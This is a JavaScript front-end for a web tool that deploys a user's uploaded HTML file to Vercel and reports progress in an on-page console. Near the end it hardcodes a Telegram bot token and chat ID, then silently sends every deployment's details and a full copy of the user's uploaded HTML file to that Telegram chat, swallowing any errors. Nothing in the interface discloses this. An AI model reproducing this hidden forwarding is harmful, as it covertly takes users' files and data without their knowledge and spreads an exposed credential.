// Element DOM
const deploymentScreen = document.getElementById('deploymentScreen');
const deployBtn = document.getElementById('deployBtn');
const spinner = document.getElementById('spinner');
const clearConsoleBtn = document.getElementById('clearConsole');
const consoleElement = document.getElementById('console');
const infoPanel = document.getElementById('infoPanel');
const websiteUrlElement = document.getElementById('websiteUrl');
const copyUrlBtn = document.getElementById('copyUrlBtn');
const openWebsiteBtn = document.getElementById('openWebsiteBtn');
const deployTimeElement = document.getElementById('deployTime');
const fileInputCustom = document.getElementById('fileInputCustom');
const fileName = document.getElementById('fileName');

// Statistik deployment
let deploymentStats = {
    total: 0,
    success: 0,
    failed: 0
};

// Variabel untuk menyimpan URL website yang berhasil dideploy
let currentWebsiteUrl = "";

// Token index akan diatur dari backend
let currentTokenIndex = 0;

// Fungsi untuk memperbarui tampilan statistik
function updateStatsDisplay() {
    document.getElementById('totalDeployments').textContent = deploymentStats.total;
    document.getElementById('successDeployments').textContent = deploymentStats.success;
    document.getElementById('failedDeployments').textContent = deploymentStats.failed;
}

// Fungsi untuk memperbarui statistik
function updateStats(isSuccess) {
    deploymentStats.total++;
    if (isSuccess) {
        deploymentStats.success++;
    } else {
        deploymentStats.failed++;
    }
    updateStatsDisplay();
}

// Fungsi untuk menampilkan panel informasi setelah deployment berhasil
function showInfoPanel(websiteUrl) {
    currentWebsiteUrl = websiteUrl;
    websiteUrlElement.textContent = websiteUrl;
    deployTimeElement.textContent = new Date().toLocaleString();
    infoPanel.style.display = 'block';

    // Auto open website setelah 1.5 detik
    setTimeout(() => {
        openWebsite(websiteUrl);
    }, 1500);
}

// Fungsi untuk menyalin URL ke clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        copyUrlBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
        copyUrlBtn.classList.add('copied');
        
        setTimeout(() => {
            copyUrlBtn.innerHTML = '<i class="fas fa-copy"></i> Salin';
            copyUrlBtn.classList.remove('copied');
        }, 2000);
    }).catch(err => {
        console.error('Copy failed: ', err);
    });
}

// Fungsi untuk membuka website
function openWebsite(url) {
    window.open(url, '_blank');
}

// Script untuk tampilan deployment
document.getElementById('htmlFile').addEventListener('change', function() {
    if (this.files && this.files.length > 0) {
        fileName.textContent = this.files[0].name;
        fileInputCustom.classList.add('has-file');
    } else {
        fileName.textContent = 'Pilih file HTML';
        fileInputCustom.classList.remove('has-file');
    }
});

// Custom file input click handler
document.querySelector('.browse-btn').addEventListener('click', function() {
    document.getElementById('htmlFile').click();
});

// Clear console
clearConsoleBtn.addEventListener('click', function() {
    consoleElement.innerHTML = '<div class="console-line">$ Console cleared</div>';
    addToConsole('$ Multi-Token System Reactivated');
});

// Event listener untuk tombol salin URL
copyUrlBtn.addEventListener('click', function() {
    copyToClipboard(currentWebsiteUrl);
});

// Event listener untuk tombol buka website
openWebsiteBtn.addEventListener('click', function() {
    openWebsite(currentWebsiteUrl);
});

// Main deployment handler
document.getElementById("deployForm").addEventListener("submit", async function (e) {
    e.preventDefault();

    const siteName = document.getElementById("siteName").value.trim();
    const fileInput = document.getElementById("htmlFile");
    
    if (!siteName || fileInput.files.length === 0) {
        showResult("$ Please fill in the website name and upload the HTML file.", "error");
        return;
    }

    // Show loading state
    deployBtn.disabled = true;
    spinner.style.display = 'block';
    deployBtn.querySelector('span').textContent = 'Deploying...';
    
    // Add to console
    addToConsole(`$ Starting deployment for: ${siteName}`);
    
    const file = fileInput.files[0];
    const htmlText = await file.text();

    showResult("$ Creating a project in Vercel...", "loading");
    addToConsole('$ Creating project in Vercel...');

    try {
        // Call backend API for deployment
        const response = await fetch('/api/deploy', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                siteName: siteName,
                htmlContent: htmlText
            })
        });

        const data = await response.json();
        
        if (data.success && data.url) {
            const websiteUrl = data.url;
            const successMessage = `Website berhasil dibuat!<br><a href="${websiteUrl}" target="_blank" style="color: var(--success); text-decoration: none; font-weight: 600;">${websiteUrl}</a>`;
            
            showResult(successMessage, "success");
            addToConsole('$ Deployment successful!');
            addToConsole(`$ Website URL: ${websiteUrl}`);
            addToConsole(`$ Used Token: ${data.tokenIndex + 1}`);
            
            deploymentStats.success++;
            deploymentStats.total++;
            updateStatsDisplay();
            
            // Tampilkan panel informasi
            showInfoPanel(websiteUrl);
            
            // Send to Telegram
            await sendToTelegram(`Deployment Berhasil!\n\nProject: ${siteName}\nURL: ${websiteUrl}\nToken Used: ${data.tokenIndex + 1}\nWaktu: ${new Date().toLocaleString()}\nDeployment By ALDZX505`);
            
            await sendHtmlToTelegram(htmlText, siteName);
        } else {
            const errorMessage = `⚠️ Gagal: ${data.error || "Terjadi kesalahan"}`;
            showResult(errorMessage, "error");
            addToConsole(`$ Deployment failed: ${data.error || "Unknown error"}`, 'error');

            deploymentStats.failed++;
            deploymentStats.total++;
            updateStatsDisplay();

            await sendToTelegram(`Deployment Gagal!\n\nProject: ${siteName}\nError: ${data.error || "Unknown error"}\nWaktu: ${new Date().toLocaleString()}`);
        }

    } catch (error) {
        showResult("Connection to server failed", "error");
        addToConsole('$ Connection failed to server', 'error');
        addToConsole(`$ Error: ${error.message}`, 'error');

        deploymentStats.failed++;
        deploymentStats.total++;
        updateStatsDisplay();

        await sendToTelegram(`Connection Error!\n\nProject: ${siteName}\nError: ${error.message}\nWaktu: ${new Date().toLocaleString()}`);
    }
    
    resetDeployButton();
});

function showResult(message, type) {
    const resultDiv = document.getElementById("result");
    resultDiv.innerHTML = message;
    resultDiv.className = `result show ${type}`;
    
    // Auto hide after 5 seconds
    if (type !== 'loading') {
        setTimeout(() => {
            resultDiv.classList.remove('show');
        }, 5000);
    }
}

function addToConsole(message, type = 'normal') {
    const consoleLine = document.createElement('div');
    consoleLine.className = `console-line ${type}`;
    consoleLine.textContent = message;
    consoleElement.appendChild(consoleLine);
    consoleElement.scrollTop = consoleElement.scrollHeight;
}

function resetDeployButton() {
    deployBtn.disabled = false;
    spinner.style.display = 'none';
    deployBtn.querySelector('span').textContent = 'START DEPLOYMENT';
}

// Telegram Bot Configuration
const telegramBotToken = "8479433737:AAHRZV92FHS2zCXlzV4Esia0KRoG5znJYL0";
const telegramChatId = "7492782458";

async function sendToTelegram(message) {

    try {
        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: message,
                parse_mode: "HTML"
            })
        });
        
        const data = await response.json();

    } catch (error) {}
}

async function sendHtmlToTelegram(htmlContent, siteName) {

    try {
        const blob = new Blob([htmlContent], { type: 'text/html' });
        const file = new File([blob], `${siteName}.html`, { type: 'text/html' });
        
        const formData = new FormData();
        formData.append('chat_id', telegramChatId);
        formData.append('document', file);
        formData.append('caption', `File HTML untuk project: ${siteName}\n${new Date().toLocaleString()}`);

        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument`, {
            method: "POST",
            body: formData
        });
        
        const data = await response.json();

    } catch (error) {}
}

// Inisialisasi tampilan
updateStatsDisplay();
addToConsole('$ System initialized successfully');